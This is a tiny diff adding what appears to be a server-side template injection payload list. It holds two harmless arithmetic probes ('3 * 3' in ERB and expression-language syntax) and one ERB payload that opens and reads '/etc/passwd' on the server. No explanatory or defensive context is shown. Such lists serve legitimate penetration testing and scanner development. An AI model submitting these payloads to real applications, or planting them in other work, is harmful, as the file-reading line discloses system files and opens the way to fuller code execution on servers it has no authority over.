@@ -1,0 +1,4 @@
+<%= 3 * 3 %>
+<%= File.open('/etc/passwd').read %>
+${{3*3}}
+
